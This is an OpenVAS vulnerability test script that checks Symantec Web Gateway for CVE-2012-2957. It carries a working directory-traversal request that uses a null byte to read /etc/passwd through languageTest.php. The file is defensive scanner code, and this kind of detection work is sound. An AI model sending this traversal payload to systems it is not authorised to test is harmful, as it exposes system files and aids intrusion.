###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_54429.nasl 12 2013-10-27 11:15:33Z jan $
#
# Symantec Web Gateway  Local File Manipulation Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Symantec Web Gateway is prone to a local authentication-bypass
vulnerability

A attacker can exploit this issue by manipulating certain local files to bypass
authentication and gain unauthorized privileged access to the application. Successful
exploits may lead to  other attacks.

Symantec Web Gateway versions 5.0.x.x are vulnerable.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103523";
CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54429);
 script_cve_id("CVE-2012-2957");
 script_tag(name:"cvss_base", value:"7.2");
 script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("Symantec Web Gateway Local File Manipulation Authentication Bypass Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54429");
 script_xref(name : "URL" , value : "http://www.symantec.com/business/web-gateway");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-07-24 10:16:58 +0200 (Tue, 24 Jul 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_symantec_web_gateway_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("symantec_web_gateway/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
url = dir + '/spywall/languageTest.php?&language=' + crap(data:"../",length:6*9) + 'etc/passwd%00';

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("root:x:0:0:root:" >< buf) {

   security_hole(port:port);
   exit(0);

}   

exit(0);
